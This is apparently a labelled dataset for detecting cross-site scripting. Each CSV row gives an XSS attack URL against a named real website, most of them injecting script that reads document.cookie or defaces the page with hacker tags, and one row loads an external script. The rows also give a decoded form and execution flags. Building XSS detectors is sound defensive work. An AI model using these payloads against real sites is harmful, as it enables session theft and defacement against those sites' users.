Payloads,Class,decoded,executed,parser_changed
http://www.apil.com/search-results.php?action=findlawyer&amp;region=&amp;specialism=%22%3e%27%3e%3cscript%3e<br>alert(123)%3c/script%3e,Malicious,"http://www.apil.com/search-results.php?action=findlawyer®ion=&specialism="">'><script>alert(123)</script>",True,True
"http://www.skirmish-islands.com/inscription.php?w=1/""><script>alert('xss by atm0n3r')</script>",Malicious,"http://www.skirmish-islands.com/inscription.php?w=1/""><script>alert('xss by atm0n3r')</script>",True,True
http://www.citruscollege.edu/apps/pubs.asp?q=1&amp;t=&lt;script&gt;alert(&quot;scriptorium(turkey)hackhaber.com&quot;)&lt;/<br>script&gt;,Malicious,"http://www.citruscollege.edu/apps/pubs.asp?q=1&t=<script>alert(""scriptorium(turkey)hackhaber.com"")</script>",True,True
http://docweb.estesl.ipl.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://docweb.estesl.ipl.pt/docbweb/thres.asp?base=isbd&searchterm=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.apxendex.com/index.php?id=32%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.apxendex.com/index.php?id=32""><script>alert(document.cookie)</script>",True,True
http://www.exampleessays.com/search-result.php?q=%3cscript%3ealert%281%29%3c%2fscript%3e&amp;p=0,Malicious,http://www.exampleessays.com/search-result.php?q=<script>alert(1)</script>&p=0,True,True
http://search.henan.gov.cn/szxx/c_search1.jsp?p=%3c%2fscript%3e%3cscript%3ealert%28&quot;xss&quot;%29%3c%2fscr<br>ipt%3e,Malicious,"http://search.henan.gov.cn/szxx/c_search1.jsp?p=</script><script>alert(""xss"")</script>",True,True
http://usparc.ihep.su/spires/find/hep/www?rawcmd=&quot;&gt;&lt;script&gt;alert(&quot;cyber-warrior.org&quot;)&lt;/script&gt;,Malicious,"http://usparc.ihep.su/spires/find/hep/www?rawcmd=""><script>alert(""cyber-warrior.org"")</script>",True,True
http://nl.888.com/site2/poker/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://nl.888.com/site2/poker/default.htm?lang=""><script>alert(document.cookie)</script>",True,True
http://www.mysql.fr/downloads/gpg.php?file=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://www.mysql.fr/downloads/gpg.php?file=<script>alert(document.cookie)</script>,True,True
http://forestry.lib.umn.edu/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmar<br>quee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://forestry.lib.umn.edu/'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.ametro.gr/cgi-bin/searchmap.cgi?terms=%3cscript%3ealert%28%2fst%40r-gaz3r%2f%29%3c%2fscri<br>pt%3e%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e&amp;boolean=0&amp;case=1&amp;x=67&amp;y=22&amp;next=0&amp;<br>gr=0,Malicious,http://www.ametro.gr/cgi-bin/searchmap.cgi?terms=<script>alert(/st@r-gaz3r/)</script><marquee><h1>st@r-gaz3r</h1></marquee>&boolean=0&case=1&x=67&y=22&next=0&gr=0,True,True
http://entity.ummu.umich.edu/~asdf/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious,"http://entity.ummu.umich.edu/~asdf/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]=""><script>alert(document.cookie)</script></script>",True,True
http://72.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://72.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://tnetsixenon.xrea.jp/rnote/?d=2006%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious,"http://tnetsixenon.xrea.jp/rnote/?d=2006"">'><script>alert('xss')</script>",True,True
http://seenonstyle.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.co<br>okie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious,http://seenonstyle.resultspage.com/search?p=q&ts=custom&w=</script><script>alert(document.cookie);</script><script>// &x=0&y=0,True,True
http://www.psalm.gov.ph/uc/login.asp?strmessage=%3e%3cscript%3ealert%28%22xssed%22%29%3c/script%3e,Malicious,"http://www.psalm.gov.ph/uc/login.asp?strmessage=><script>alert(""xssed"")</script>",True,True
http://www.freeauctions.co.nz/showcategory.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.freeauctions.co.nz/showcategory.php?cid=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.ylepb.gov.tw/info/profile4.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious,"http://www.ylepb.gov.tw/info/profile4.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]=""><script>alert(document.cookie)</script></script>",True,True
http://web.na.org/index.php?id=se&amp;words=xssed&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://web.na.org/index.php?id=se&words=xssed""><script>alert(123)</script>",True,True
http://www.aeroport.fr/accueil/moteur-de-recherche.php?langue=fr&amp;mr=%22%3e%3cscript%3ealert%281337%2<br>9%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xerces%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://www.aeroport.fr/accueil/moteur-de-recherche.php?langue=fr&mr=""><script>alert(1337)</script>><marquee><h1>xss by xerces</h1></marquee>",True,True
http://hamilton.en.craigslist.ca/search/sss?query='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;,Malicious,"http://hamilton.en.craigslist.ca/search/sss?query='""><script>alert('xss');</script>",True,True
http://www.environment.gov.pk/aqi/uploadfiles/uploadform.asp?msg=%3c/%3e%3cscript%3ealert%28%22xssed<br>%20by%20angle%20a.k.a%20malwarrior%22%29;%3c/script%3e,Malicious,"http://www.environment.gov.pk/aqi/uploadfiles/uploadform.asp?msg=</><script>alert(""xssed by angle a.k.a malwarrior"");</script>",True,True
http://www.winamp.com/videos/browse.php?&amp;genre=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.winamp.com/videos/browse.php?&genre=""><script>alert(document.cookie)</script>",True,True
http://www.qzzx.gov.cn/seek.asp?seekstr=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.qzzx.gov.cn/seek.asp?seekstr=<script>alert(""xss"")</script>",True,True
http://shopping.web.de/preischeck/akku-c_7096-0011.html?s=%3c%22%3c%3cscript%3ealert%28document.cook<br>ie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript<br>%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscr<br>ipt%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28doc<br>ument.cookie%29%3c%2fscript%3e,Malicious,"http://shopping.web.de/preischeck/akku-c_7096-0011.html?s=<""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script>",True,True
http://news.msn.co.kr/gate/v2/poll/poll.html?poll_idx=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://news.msn.co.kr/gate/v2/poll/poll.html?poll_idx=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.hau1.info/forum/redirector.php?url=%3cscript%3ealert(2)%3c/script%3e,Malicious,http://www.hau1.info/forum/redirector.php?url=<script>alert(2)</script>,True,True
http://infostore.org/search?s=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%27&amp;type=0,Malicious,"http://infostore.org/search?s="">'><script>alert(123)</script>""'&type=0",True,True
https://secure.wired.com/user/registration?returnto=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"https://secure.wired.com/user/registration?returnto=""><script>alert(1);</script>",True,True
http://roma.corriere.it/milano/aziende/search?cosa=%22%3e%3cscript%3ealert%28document.cookie%29;%3c/<br>script%3e&amp;dove=milano&amp;provincia=milano&amp;partner=rcs&amp;dominio=milano&amp;cerca=,Malicious,"http://roma.corriere.it/milano/aziende/search?cosa=""><script>alert(document.cookie);</script>&dove=milano&provincia=milano&partner=rcs&dominio=milano&cerca=",True,True
http://www.mitschka.eu/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.mitschka.eu/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.orintec.co.il/scripts/openextra.asp?extra=%22%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.orintec.co.il/scripts/openextra.asp?extra=""><script>alert(document.cookie)</script>><marquee><h1>meloulisi</h1></marquee>",True,True
http://www.dejaya.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoti<br>cxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.dejaya.com/gallery/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
https://astounded.tv/store/shopcustadmin.asp?msg=%3cscript%3ealert('by%20w0lfr4m%20cyber-unity%2%200<br>team');%3c/script%3e,Malicious,https://astounded.tv/store/shopcustadmin.asp?msg=<script>alert('by w0lfr4m cyber-unity%2 0team');</script>,True,True
http://www.erp.navy.mil/search.asp?glossarysearch=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%<br>2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit=search,Malicious,"http://www.erp.navy.mil/search.asp?glossarysearch='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&submit=search",True,True
http://www.bl.uk/cgi-bin/print.cgi?url=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.bl.uk/cgi-bin/print.cgi?url=""><script>alert(""maxwel"")</script>",True,True
http://support.onsite.no/esupport/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(docu<br>ment.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious,"http://support.onsite.no/esupport/index.php?<script language=""javascript"" src=""http://kabustr.com/chat/c.js"" type=""text/javascript"">kabus-kabustr.com-kabus-kabustr.com</script><script>alert(document.cookie);</script><script>alert(/kabus/);</script>",True,True
http://www.xzqh.cn/class.asp?owen1=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.xzqh.cn/class.asp?owen1=<script>alert(""xss"")</script>",True,True
"http://skicircus.loop-server.com/unsubscribe.asp?m=1&email=""'>""'><script>window.alert(document.cookie)</script>",Malicious,"http://skicircus.loop-server.com/unsubscribe.asp?m=1&email=""'>""'><script>window.alert(document.cookie)</script>",True,True
http://star-ecentral.com/news/story.asp?file=/2008/10/10/music/2133568&amp;sec=music%22%3e%3cscript%3eal<br>ert(document.cookie)%3c/script%3e,Malicious,"http://star-ecentral.com/news/story.asp?file=/2008/10/10/music/2133568&sec=music""><script>alert(document.cookie)</script>",True,True
http://www.psr.gov.au/search.asp?qu=friendly&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious,"http://www.psr.gov.au/search.asp?qu=friendly""><script>alert(""bluemax"")</script>",True,True
http://www.humanrightsfirst.org/search/search.asp?query=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.humanrightsfirst.org/search/search.asp?query=""><script>alert(""maxwel"")</script>",True,True
http://search.hit.bg/?what=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22&amp;where=3,Malicious,"http://search.hit.bg/?what=""><script>alert(123)</script>""&where=3",True,True
http://www.amsat.org/amsat-new/satellites/satinfo.php?satid=92&amp;returl=%22%3e%27%3e%3c%73%63%72%69%70<br>%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%<br>31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%3<br>1%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.amsat.org/amsat-new/satellites/satinfo.php?satid=92&returl="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.tzscheutschler.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.tzscheutschler.de/cms/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.kriti.com.tr/index.php?pages=kriti&amp;act=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cooki<br>e)%3b%3c/script%3e,Malicious,"http://www.kriti.com.tr/index.php?pages=kriti&act=>""><script 
>alert(document.cookie);</script>",True,True
http://www.labsafety.com/store/dept.asp?dept_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.labsafety.com/store/dept.asp?dept_id=""><script>alert(""maxwel"")</script>",True,True
http://www.capoliticalnews.com/s/spip.php?action=cookie&amp;url=%22'/%3e%3cscript%3ealert('hello%20the%2<br>0rat')%3c/script%3e,Malicious,"http://www.capoliticalnews.com/s/spip.php?action=cookie&url=""'/><script>alert('hello the rat')</script>",True,True
http://focus-webapps.ti.com/general/docs/sitesearch/searchdevice.tsp;jsessionid=iwfxvz3vt02gjqc1jawc<br>m4q?partnumber=%22+%27%3e%3cscript%3ealert(%27cueballr%27)%3c%2fscript%3e,Malicious,"http://focus-webapps.ti.com/general/docs/sitesearch/searchdevice.tsp;jsessionid=iwfxvz3vt02gjqc1jawcm4q?partnumber="" '><script>alert('cueballr')</script>",True,True
http://immo.nicematin.com/pqrpa/default/palist?rub_id=im&amp;libre=%22%3e%3cscript%3ealert%28%22xss!%22%<br>29%3c/script%3e,Malicious,"http://immo.nicematin.com/pqrpa/default/palist?rub_id=im&libre=""><script>alert(""xss!"")</script>",True,True
http://37.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://37.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://promotions.vogue.com.au/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious,"http://promotions.vogue.com.au/webcards/tools/calendar.php?month=""><script>alert(document.cookie)</script>",True,True
http://www.se7ensins.com/forums/xbox-360-discussion/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cooki<br>e);&lt;/script&gt;,Malicious,"http://www.se7ensins.com/forums/xbox-360-discussion/?threadprefix=""></a><script>alert(document.cookie);</script>",True,True
http://my.gwu.edu/mod/directory/index.cfm?keywords=%22%3e%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e&amp;role=all&amp;x=8&amp;y=13&amp;u=,Malicious,"http://my.gwu.edu/mod/directory/index.cfm?keywords=""><script>alert(document.cookie)</script>&role=all&x=8&y=13&u=",True,True
http://hudba.heureka.cz/f--interpret_runrig-_-interpret_jay-z/%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e/,Malicious,"http://hudba.heureka.cz/f--interpret_runrig-_-interpret_jay-z/'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>/",True,True
http://www.newsomart.com/image.php?id=625%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.newsomart.com/image.php?id=625""><script>alert(document.cookie)</script>",True,True
http://www.thedjlist.com/search.php?search=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://www.thedjlist.com/search.php?search=<script>alert(document.cookie)</script>,True,True
http://secure.digitallook.com/cgi-bin/digitalcorporate/msn/market_bar_charts.cgi?action=&amp;username=&amp;a<br>c=&amp;csi=&amp;classification_id=averages&amp;average_type=mean&amp;dataplotcatergory=share_performance&amp;data_point=<br>price_mvt_30d&amp;orderby=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://secure.digitallook.com/cgi-bin/digitalcorporate/msn/market_bar_charts.cgi?action=&username=&ac=&csi=&classification_id=averages&average_type=mean&dataplotcatergory=share_performance&data_point=price_mvt_30d&orderby=""><script>alert(1)</script>",True,True
http://www.tiaa-cref.org/explore/portlets/search.jsp?srchtype=4&amp;frmf=1&amp;sc=1&amp;query=%22%3e%3cscript%3e<br>alert(document.cookie)%3c%2fscript%3e&amp;submit.x=0&amp;submit.y=0&amp;submit=submit,Malicious,"http://www.tiaa-cref.org/explore/portlets/search.jsp?srchtype=4&frmf=1&sc=1&query=""><script>alert(document.cookie)</script>&submit.x=0&submit.y=0&submit=submit",True,True
"https://www.pinkbike.com/buysell/list/?q=%3c%3cscript%3ealert%28%22xss%20discoverd%20by%20pin0yexpl0<br>itteam%20==%3e%3e%3e%3e%20greets%20to%20phantom29m,%20frenzycondomx,%20nephron,%20djkilla%3c%3c===++<br>%20longlive%20to%20all%20filipino%20hackers!++_redhat9112_%22%29;//%3c%3c/script%3e&amp;category=0&amp;pmin=<br>&amp;pmax=&amp;region=",Malicious,"https://www.pinkbike.com/buysell/list/?q=<<script>alert(""xss discoverd by pin0yexpl0itteam ==>>>> greets to phantom29m, frenzycondomx, nephron, djkilla<<===   longlive to all filipino hackers!  _redhat9112_"");//<</script>&category=0&pmin=&pmax=®ion=",True,True
http://tarimdergisi.yyu.edu.tr/htmls/arama.asp?arayalim=&quot;&gt;&lt;script&gt;alert(&quot;lt.jethawk&quot;)&lt;/script&gt;,Malicious,"http://tarimdergisi.yyu.edu.tr/htmls/arama.asp?arayalim=""><script>alert(""lt.jethawk"")</script>",True,True
http://www.chosenspace.com/v2.php?page=signup&amp;ref=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--&amp;old_id=,Malicious,"http://www.chosenspace.com/v2.php?page=signup&ref=""></iframe><script>alert(1);</script><!--&old_id=",True,True
http://halten.be/mgallery/index.php?c=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://halten.be/mgallery/index.php?c=""><script>alert(document.cookie)</script>",True,True
http://nasnedogoniat.sourceforge.net/faq.php?lang=%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e,Malicious,"http://nasnedogoniat.sourceforge.net/faq.php?lang=""><script>alert(document.cookie)</script>",True,True
http://www.orlando-miamilistings.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious,http://www.orlando-miamilistings.com/?pg=asdf<script>alert(1337)</script>&frame=1,True,True
http://tr.netlog.com/go/search/go/search/view=people&amp;q=%2522%253e%253c%2573%2563%2572%2569%2570%2574<br>%253e%2561%256c%2565%2572%2574%2528%2522%2561%2563%2569%256b%2522%2529%253c%252f%2573%2563%2572%2569<br>%2570%2574%253e&amp;submit=ara&amp;amp;v=g,Malicious,"http://tr.netlog.com/go/search/go/search/view=people&q=""><script>alert(""acik"")</script>&submit=ara&v=g",True,True
